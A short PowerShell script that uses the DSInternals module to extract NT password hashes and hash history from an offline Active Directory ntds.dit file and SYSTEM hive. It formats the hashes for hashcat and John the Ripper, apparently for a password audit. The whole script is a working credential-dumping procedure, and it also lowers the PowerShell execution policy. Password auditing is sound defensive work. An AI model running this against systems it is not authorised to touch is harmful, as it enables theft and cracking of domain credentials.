#Get Hashes using the DSintenals custom view
Set-ExecutionPolicy -ExecutionPolicy Unrestricted
Set-PSRepository -Name 'PSGallery' -InstallationPolicy Trusted

Install-Module -Name DSInternals

$bootkey = Get-BootKey -SystemHivePath 'C:\users\mRr3b00t\Downloads\nt_audit\registry\SYSTEM'

$ntdsaudit = Get-ADDBAccount -All -DBPath 'C:\Users\mRr3b00t\Downloads\nt_audit\Active Directory\ntds.dit' -bootkey $bootkey

$ntdsaudit | Format-Custom -View HashcatNT
$ntdsaudit  | Format-Custom -View HashcatNTHistory
$ntdsaudit  | Format-Custom -View JohnNT
$ntdsaudit  | Format-Custom -View JohnNTHistory

# to dump these try 
$ntdsaudit  | Format-Custom -View HashcatNTHistory | Out-File C:\users\mRr3b00t\Downloads\hashcat-6.2.2\hashhashhash.txt -Encoding utf8

#the encoding matters ;) - mRr3b00t
